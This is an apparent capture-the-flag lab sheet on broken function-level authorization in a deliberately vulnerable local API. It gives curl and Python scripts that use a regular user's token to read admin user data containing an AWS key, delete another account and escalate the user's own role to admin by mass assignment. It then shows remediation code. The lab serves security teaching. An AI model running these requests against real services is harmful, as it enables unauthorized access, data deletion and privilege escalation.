# Lab 06: Broken Function Level Authorization

## Overview

| Field          | Details                                               |
|----------------|-------------------------------------------------------|
| **Objective**  | Access admin functionality as a regular user           |
| **Difficulty** | ⭐⭐ Medium                                           |
| **Time**       | 45 minutes                                            |
| **Category**   | Authorization / Privilege Escalation                   |
| **OWASP**      | API5:2023 - Broken Function Level Authorization        |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5000`
- `curl` or an HTTP client
- Python 3 with the `requests` library installed
- Completion of Labs 01–04 (recommended)
- Understanding of JWT tokens and role-based access control

---

## Background

**Broken Function Level Authorization (BFLA)** occurs when an API fails to properly verify that the authenticated user has the required role or permissions to execute a specific function. Unlike BOLA (which is about accessing specific data objects), BFLA is about accessing entire **functions or administrative features** that should be restricted to certain roles.

**Common causes:**
- The API only checks if a user is authenticated (has a valid JWT) but doesn't verify the user's role
- Admin endpoints follow predictable URL patterns (e.g., `/api/v1/admin/...`) and are easily discoverable
- The frontend hides admin buttons, but the backend doesn't enforce access controls
- Role checks exist on some endpoints but not others

In this lab, you'll log in as Alice (a regular user with `role=user`) and attempt to access all admin endpoints. You'll discover that the API only checks for a valid JWT token but doesn't verify the `admin` role.

---

## Tasks

### Task 1: Login as Alice (Regular User)

Authenticate as Alice and confirm her role.

**Steps:**
1. Login as alice (username: `alice`, password: `password123`)
2. Decode the JWT token to confirm Alice's role is `user` (not `admin`)
3. Note: You can decode JWTs at [jwt.io](https://jwt.io) or use Python

**curl example:**
```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "Token: $TOKEN"

# Decode the JWT (middle part is the payload)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

**Python example:**
```python
import requests
import json
import base64

BASE = "http://localhost:5000"

# Login as alice
r = requests.post(f"{BASE}/api/v1/auth/login",
    json={"username": "alice", "password": "password123"})
token = r.json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# Decode JWT payload
payload = token.split(".")[1]
# Add padding for base64
payload += "=" * (4 - len(payload) % 4)
decoded = json.loads(base64.b64decode(payload))
print(f"JWT Payload: {json.dumps(decoded, indent=2)}")
print(f"Alice's role: {decoded.get('role', 'N/A')}")
```

<details>
<summary>💡 Hint 1</summary>
Alice's role in the JWT payload should be "user", not "admin".
</details>

<details>
<summary>💡 Hint 2</summary>
The JWT has three parts separated by dots. The middle part is the base64-encoded payload.
</details>

<details>
<summary>💡 Hint 3</summary>
After decoding, you should see something like: {"sub": 1, "username": "alice", "role": "user", ...}
</details>

---

### Task 2: Access Admin User List

Try to access the admin endpoint that lists all users with internal details.

**Steps:**
1. Send a GET request to `/api/v1/admin/users` using Alice's token
2. If successful, examine the data — it should contain internal notes and sensitive fields
3. Look for the admin's internal_notes field — it may contain AWS keys

**🚩 FLAG 1: What are the contents of admin's internal_notes? (Contains an AWS key)**

**curl example:**
```bash
# Access admin user list as alice (regular user)
curl -s http://localhost:5000/api/v1/admin/users \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Python example:**
```python
# Access admin endpoint with alice's (regular user) token
r = requests.get(f"{BASE}/api/v1/admin/users", headers=headers)
print(f"Status: {r.status_code}")

if r.status_code == 200:
    users = r.json()
    print(f"[VULN] Regular user can access admin user list!")
    print(f"Total users returned: {len(users) if isinstance(users, list) else 'N/A'}")

    # Look for internal_notes
    if isinstance(users, list):
        for user in users:
            notes = user.get("internal_notes", "")
            if notes:
                print(f"  User '{user.get('username')}' internal_notes: {notes}")
    elif isinstance(users, dict) and "users" in users:
        for user in users["users"]:
            notes = user.get("internal_notes", "")
            if notes:
                print(f"  User '{user.get('username')}' internal_notes: {notes}")
elif r.status_code == 403:
    print("[SECURE] Access denied — role check is working.")
else:
    print(f"Unexpected: {r.status_code} - {r.text}")
```

<details>
<summary>💡 Hint 1</summary>
Just try the request with Alice's token. The API might not check the role at all.
</details>

<details>
<summary>💡 Hint 2</summary>
If you get a 200 response, the API is vulnerable. Look through each user's data for "internal_notes".
</details>

<details>
<summary>💡 Hint 3</summary>
The admin user's internal_notes field contains an AWS access key. The API only checks if you have a valid JWT — it doesn't verify you're actually an admin.
</details>

---

### Task 3: Access Admin Statistics

Access the admin statistics endpoint to view internal platform metrics.

**Steps:**
1. Send a GET request to `/api/v1/admin/stats` using Alice's token
2. Look for statistics about private posts, total messages, and other internal metrics

**🚩 FLAG 2: What is the total number of private posts?**

**curl example:**
```bash
curl -s http://localhost:5000/api/v1/admin/stats \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Python example:**
```python
r = requests.get(f"{BASE}/api/v1/admin/stats", headers=headers)
print(f"Status: {r.status_code}")

if r.status_code == 200:
    stats = r.json()
    print(f"[VULN] Regular user can access admin stats!")
    print(f"Stats: {json.dumps(stats, indent=2)}")
    print(f"Private posts: {stats.get('private_posts', 'N/A')}")
else:
    print(f"Response: {r.text}")
```

<details>
<summary>💡 Hint 1</summary>
The stats endpoint likely returns counts of various resources including private posts.
</details>

<details>
<summary>💡 Hint 2</summary>
Look for a field like "private_posts" or "posts_private" in the stats response.
</details>

<details>
<summary>💡 Hint 3</summary>
The stats endpoint returns internal metrics. The "private_posts" field shows how many private posts exist on the platform.
</details>

---

### Task 4: Delete a User via Admin Endpoint

Try to use the admin delete endpoint to remove a user.

**Steps:**
1. Send a DELETE request to `/api/v1/admin/users/3` (charlie) using Alice's token
2. Verify whether the deletion was successful
3. Try to access Charlie's profile afterward to confirm

**curl example:**
```bash
# Delete Charlie's account using Alice's (regular user) token
curl -s -X DELETE http://localhost:5000/api/v1/admin/users/3 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Verify deletion
curl -s http://localhost:5000/api/v1/users/3 \
  -H "Authorization: Bearer $TOKEN"
```

**Python example:**
```python
# WARNING: This actually deletes the user! The server may need a restart to restore data.

# Delete charlie (id=3) using alice's token
r = requests.delete(f"{BASE}/api/v1/admin/users/3", headers=headers)
print(f"Delete status: {r.status_code}")
print(f"Response: {r.json()}")

if r.status_code == 200:
    print("[VULN] Regular user successfully deleted another user via admin endpoint!")

    # Verify
    r = requests.get(f"{BASE}/api/v1/users/3", headers=headers)
    print(f"Verify charlie exists: {r.status_code}")
```

<details>
<summary>💡 Hint 1</summary>
Be careful — this might actually delete the user. The API server may need to be restarted to restore data.
</details>

<details>
<summary>💡 Hint 2</summary>
If the DELETE returns 200, the API is critically vulnerable — any authenticated user can delete any account.
</details>

<details>
<summary>💡 Hint 3</summary>
The API accepts the delete request because it only checks if the JWT is valid, not whether the user has admin privileges.
</details>

---

### Task 5: Escalate Privileges — Change Your Own Role

Try to change your own role from `user` to `admin`.

**Steps:**
1. Check if there's a role update endpoint: `PUT /api/v1/admin/users/:id/role`
2. Alternatively, try updating your profile with an extra `role` field via mass assignment
3. Login again to get a new token and verify your role changed

**🚩 FLAG 3: Successfully change your own role to admin**

**Python example:**
```python
# Method 1: Try the admin role endpoint
r = requests.put(f"{BASE}/api/v1/admin/users/1/role",
    headers=headers,
    json={"role": "admin"})
print(f"Admin role endpoint: {r.status_code} - {r.json()}")

# Method 2: Try mass assignment via user update
r = requests.put(f"{BASE}/api/v1/users/1",
    headers=headers,
    json={"role": "admin"})
print(f"User update with role: {r.status_code} - {r.json()}")

# Verify: Login again and check the new token
r = requests.post(f"{BASE}/api/v1/auth/login",
    json={"username": "alice", "password": "password123"})
if r.status_code == 200:
    new_token = r.json()["token"]
    payload = new_token.split(".")[1]
    payload += "=" * (4 - len(payload) % 4)
    decoded = json.loads(base64.b64decode(payload))
    print(f"New role: {decoded.get('role', 'N/A')}")
    if decoded.get("role") == "admin":
        print("[SUCCESS] Alice is now admin!")
```

<details>
<summary>💡 Hint 1</summary>
Try both approaches: the admin endpoint for role changes and mass assignment through the regular user update endpoint.
</details>

<details>
<summary>💡 Hint 2</summary>
Mass assignment means the API accepts and processes a "role" field in the user update request even though the client shouldn't be able to set it.
</details>

<details>
<summary>💡 Hint 3</summary>
Try: <code>PUT /api/v1/users/1</code> with body <code>{"role": "admin"}</code>. If the API processes the role field, you've escalated privileges. Login again to get a new token reflecting the admin role.
</details>

---

## Flags to Find

| Flag   | Description                                     | Hint                                     |
|--------|-------------------------------------------------|------------------------------------------|
| FLAG 1 | Admin's internal_notes content (AWS key)        | Found in admin users list                |
| FLAG 2 | Total number of private posts                   | Found in admin stats endpoint            |
| FLAG 3 | Successfully change own role to admin           | Via admin endpoint or mass assignment    |

---

## Remediation

### 1. Implement Role-Based Access Control (RBAC)
```python
from functools import wraps

def admin_required(f):
    @wraps(f)
    @jwt_required()
    def wrapper(*args, **kwargs):
        current_user = get_current_user()
        if current_user.role != "admin":
            return jsonify({"error": "Admin access required"}), 403
        return f(*args, **kwargs)
    return wrapper

@app.route("/api/v1/admin/users")
@admin_required
def admin_list_users():
    # Only actual admins can reach this code
    pass
```

### 2. Verify Role in JWT Claims
```python
@app.route("/api/v1/admin/stats")
@jwt_required()
def admin_stats():
    claims = get_jwt()
    if claims.get("role") != "admin":
        return jsonify({"error": "Insufficient permissions"}), 403

    # Additional check: verify against database (don't trust JWT alone)
    user = User.query.get(get_jwt_identity())
    if user.role != "admin":
        return jsonify({"error": "Insufficient permissions"}), 403
```

### 3. Prevent Mass Assignment
```python
ALLOWED_UPDATE_FIELDS = ["display_name", "bio", "avatar_url"]

@app.route("/api/v1/users/<int:user_id>", methods=["PUT"])
@jwt_required()
def update_user(user_id):
    data = request.get_json()
    # Only allow specific fields — never accept 'role', 'is_admin', etc.
    updates = {k: v for k, v in data.items() if k in ALLOWED_UPDATE_FIELDS}

    if "role" in data or "is_admin" in data:
        return jsonify({"error": "Cannot modify protected fields"}), 403
```

### 4. Use Separate API Prefixes with Middleware
```python
# Apply admin check to ALL routes under /api/v1/admin/
@app.before_request
def check_admin_routes():
    if request.path.startswith("/api/v1/admin"):
        token = verify_jwt()
        user = User.query.get(token["sub"])
        if not user or user.role != "admin":
            return jsonify({"error": "Access denied"}), 403
```

### 5. OWASP Recommendations
- **API5:2023**: Implement a consistent authorization module that is invoked for all business functions. Deny all access by default and require explicit grants. Review API endpoints against function-level access control requirements.

---

## References

- [OWASP API Security Top 10 - API5:2023](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [PortSwigger: Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
